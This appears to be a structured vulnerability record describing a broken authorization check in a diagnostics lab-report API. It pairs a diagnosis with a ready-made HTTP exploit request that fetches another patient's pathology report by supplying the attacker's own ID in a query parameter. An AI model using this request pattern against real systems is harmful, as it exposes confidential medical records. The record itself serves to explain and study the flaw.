diagnosis: The diagnostic lab report endpoint applies a @PreAuthorize expression that evaluates an unverified query parameter (patientId) against the authenticated username rather than inspecting the patient ID associated with the requested lab order. An attacker can pass their own username in the query parameter while requesting another patient's confidential pathology report.
exploit_request:
GET /api/lab-orders/80129/report?patientId=attacker_id HTTP/1.1
Host: labs.diagnostics-health.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlcl9pZCJ9.signature
Accept: application/json
